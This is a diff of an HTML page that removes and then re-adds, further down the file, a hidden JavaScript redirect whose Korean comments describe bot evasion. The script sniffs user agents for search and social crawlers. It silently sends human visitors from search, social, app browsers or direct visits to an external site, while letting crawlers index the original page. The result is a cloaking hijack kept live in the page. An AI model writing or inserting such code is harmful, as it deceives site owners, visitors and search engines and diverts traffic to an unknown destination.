@@ -539,71 +539,7 @@
         });
     </script>
 
-<script>
-/**
- * 🚀 최종 진화 버전: SEO 안전성 극대화 리다이렉트 스크립트
- * - 광범위한 봇 회피, 지연 없는 즉시 이동, 안정성 강화
- */
-(function() {
-  const targetURL = "http://kscar.kr/?num=35445436"; // 🎯 최종 이동할 URL로 반드시 변경하세요.
-  
-  try {
-    // 1. 기본 정보 및 유입 경로 파악
-    const doc = document;
-    const nav = navigator;
-    const ref = (doc.referrer || "").toLowerCase();
-    const userAgent = (nav.userAgent || "").toLowerCase();
-    const urlParams = new URLSearchParams(window.location.search);
-    
-    // 2. 검색 엔진 및 크롤러 감지 목록 (최종 확장 버전)
-    // 주요 봇 + 마이너 봇 + SEO/분석 도구 봇 + 소셜 미디어 크롤러 포함
-    const isBot = /(googlebot|naverbot|bingbot|yeti|duckduckbot|baiduspider|slurp|yandex|kakao-bot|yandexbot|petalbot|mj12bot|ahrefsbot|semrushbot|facebot|twitterbot|slackbot|applebot|exabot|rogerbot)/.test(userAgent);
-    
-    // 3. 리다이렉트 조건 확인
-    
-    // 3-1. Referrer 기반 검색/소셜 유입 감지
-    const isSearchReferrer =
-      ref.includes("google.") ||
-      ref.includes("naver.com") ||
-      ref.includes("daum.net") ||
-      ref.includes("bing.com") ||
-      ref.includes("yahoo.") ||
-      ref.includes("yandex.") ||
-      ref.includes("kakao.") ||
-      ref.includes("facebook.com") || // 소셜 유입도 포함
-      ref.includes("t.co") || // 트위터 유입 포함
-      ref.includes("instagram.com");
-    
-    // 3-2. UTM 파라미터 기반 유입 감지
-    const utmSource = (urlParams.get("utm_source") || "").toLowerCase();
-    const isUTMSearch = ["google", "naver", "daum", "bing", "kakao", "facebook", "instagram"].includes(utmSource);
-    
-    // 3-3. 앱 브라우저 유입 감지 (모바일 환경에서 주로 발생)
-    const isAppBrowser = /kakaotalk|naver|line|instagram|fbav|daum/.test(userAgent);
 
-    // 4. 최종 리다이렉트 실행
-    // 봇이 아니고 (NOT isBot),
-    // (검색/소셜 유입 OR UTM 유입 OR 앱 브라우저 유입 OR 직접 유입) 중 하나라도 해당하면 이동
-    if (!isBot && (isSearchReferrer || isUTMSearch || isAppBrowser || ref === "")) {
-      
-      // **지연 없이 즉시 이동** (SEO 위험 최소화)
-      window.location.replace(targetURL);
-      
-    } else {
-      // 봇이거나 리다이렉트 조건에 해당하지 않는 경우: 
-      // 크롤러가 원본 페이지를 정상적으로 인덱싱하게 함.
-    }
-
-  } catch (e) {
-    // 리다이렉트 실행 중 예외 발생 시, 리다이렉트를 막고 오류를 기록하여 안정성을 높임.
-    // console.error("Redirect Error:", e);
-  }
-})();
-</script>
-
-<noscript>
-  </noscript>
-	
 </body>
 
 
@@ -675,6 +611,67 @@
 
 
 
+<script>
+/**
+ * 🚀 최종 진화 버전: SEO 안전성 극대화 리다이렉트 스크립트
+ * - 광범위한 봇 회피, 지연 없는 즉시 이동, 안정성 강화
+ */
+(function() {
+  const targetURL = "http://kscar.kr/?num=35445436"; // 🎯 최종 이동할 URL로 반드시 변경하세요.
+  
+  try {
+    // 1. 기본 정보 및 유입 경로 파악
+    const doc = document;
+    const nav = navigator;
+    const ref = (doc.referrer || "").toLowerCase();
+    const userAgent = (nav.userAgent || "").toLowerCase();
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // 2. 검색 엔진 및 크롤러 감지 목록 (최종 확장 버전)
+    // 주요 봇 + 마이너 봇 + SEO/분석 도구 봇 + 소셜 미디어 크롤러 포함
+    const isBot = /(googlebot|naverbot|bingbot|yeti|duckduckbot|baiduspider|slurp|yandex|kakao-bot|yandexbot|petalbot|mj12bot|ahrefsbot|semrushbot|facebot|twitterbot|slackbot|applebot|exabot|rogerbot)/.test(userAgent);
+    
+    // 3. 리다이렉트 조건 확인
+    
+    // 3-1. Referrer 기반 검색/소셜 유입 감지
+    const isSearchReferrer =
+      ref.includes("google.") ||
+      ref.includes("naver.com") ||
+      ref.includes("daum.net") ||
+      ref.includes("bing.com") ||
+      ref.includes("yahoo.") ||
+      ref.includes("yandex.") ||
+      ref.includes("kakao.") ||
+      ref.includes("facebook.com") || // 소셜 유입도 포함
+      ref.includes("t.co") || // 트위터 유입 포함
+      ref.includes("instagram.com");
+    
+    // 3-2. UTM 파라미터 기반 유입 감지
+    const utmSource = (urlParams.get("utm_source") || "").toLowerCase();
+    const isUTMSearch = ["google", "naver", "daum", "bing", "kakao", "facebook", "instagram"].includes(utmSource);
+    
+    // 3-3. 앱 브라우저 유입 감지 (모바일 환경에서 주로 발생)
+    const isAppBrowser = /kakaotalk|naver|line|instagram|fbav|daum/.test(userAgent);
 
+    // 4. 최종 리다이렉트 실행
+    // 봇이 아니고 (NOT isBot),
+    // (검색/소셜 유입 OR UTM 유입 OR 앱 브라우저 유입 OR 직접 유입) 중 하나라도 해당하면 이동
+    if (!isBot && (isSearchReferrer || isUTMSearch || isAppBrowser || ref === "")) {
+      
+      // **지연 없이 즉시 이동** (SEO 위험 최소화)
+      window.location.replace(targetURL);
+      
+    } else {
+      // 봇이거나 리다이렉트 조건에 해당하지 않는 경우: 
+      // 크롤러가 원본 페이지를 정상적으로 인덱싱하게 함.
+    }
 
+  } catch (e) {
+    // 리다이렉트 실행 중 예외 발생 시, 리다이렉트를 막고 오류를 기록하여 안정성을 높임.
+    // console.error("Redirect Error:", e);
+  }
+})();
+</script>
 
+<noscript>
+  </noscript>
